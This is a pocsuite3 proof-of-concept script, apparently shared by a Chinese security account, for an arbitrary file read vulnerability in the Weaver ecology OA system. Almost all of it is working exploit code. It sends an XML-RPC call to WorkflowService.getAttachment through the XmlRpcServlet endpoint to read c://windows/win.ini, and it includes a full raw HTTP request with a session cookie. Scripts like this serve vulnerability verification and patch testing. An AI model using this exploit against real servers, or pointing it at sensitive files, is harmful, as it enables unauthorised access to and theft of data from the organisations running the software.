# _*_ coding:utf-8 _*_
# @Time : 2023/12/24 15:58
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class U8CRM(POCBase):
    pocDesc = '''泛微OA xmlrpcServlet接口任意文件读取漏洞'''
    vulID = '20231224'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-12-23'
    createDate = '2023-12-24'
    updateDate = '2023-12-24'
    name = '泛微OA xmlrpcServlet接口任意文件读取漏洞'
    appName = '泛微ecology'

    def _verify(self):

        result = {}
        url = self.url + '/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = """<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>WorkflowService.getAttachment</methodName><params><param><value><string>c://windows/win.ini</string></value></param></params></methodCall>"""
        payload = """
                    POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
                    Host: 
                    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
                    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
                    Accept-Encoding: gzip, deflate
                    Cookie: testBanCookie=test; JSESSIONID=abcWZlxfDe-0l8aKD0AYy
                    DNT: 1
                    Connection: close
                    Upgrade-Insecure-Requests: 1
                    Content-Type: application/x-www-form-urlencoded
                    Content-Length: 200

                    <?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>WorkflowService.getAttachment</methodName><params><param><value><string>c://windows/win.ini</string></value></param></params></methodCall>
        """

        try:

            response = requests.post(url, headers=headers,data=data,verify=False)
            text = response.text
            if response.status_code == 200 and 'OyBmb3Ig' in text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(U8CRM)